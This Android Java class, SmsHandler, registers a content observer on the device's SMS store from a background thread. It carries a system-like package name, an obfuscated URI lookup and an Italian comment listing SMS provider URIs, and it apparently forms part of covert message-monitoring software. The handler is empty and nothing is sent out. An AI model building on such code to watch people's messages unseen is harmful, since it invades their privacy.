package com.android.service.interfaces;

import android.content.ContentResolver;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;

import com.android.service.Messages;
import com.android.service.Status;

public class SmsHandler extends Thread {
	private static final String TAG = "SmsHandler"; //$NON-NLS-1$

	private Handler handler;
	private ContentObserver smsObserver;

	@Override
	public void run() {
		Looper.prepare();

		handler = new Handler() {
			@Override
			public void handleMessage(Message msg) {
				// process incoming messages here
			}
		};

		smsObserver = new SmsObserver(handler);

		final ContentResolver cr = Status.getAppContext().getContentResolver();

		/*
		 * I possibili content resolver sono Inbox = "content://sms/inbox"
		 * Failed = "content://sms/failed" Queued = "content://sms/queued" Sent
		 * = "content://sms/sent" Draft = "content://sms/draft" Outbox =
		 * "content://sms/outbox" Undelivered = "content://sms/undelivered" All
		 * = "content://sms/all" Conversations = "content://sms/conversations"
		 * All Conversations = "content://mms-sms/conversations" All messages =
		 * "content://mms-sms" All SMS = "content://sms"
		 */
		cr.registerContentObserver(Uri.parse(Messages.getString("25.0")), true, smsObserver); //$NON-NLS-1$

		Looper.loop();
	}

	public void quit() {
		if (handler != null) {
			handler.getLooper().quit();
		}
	}
}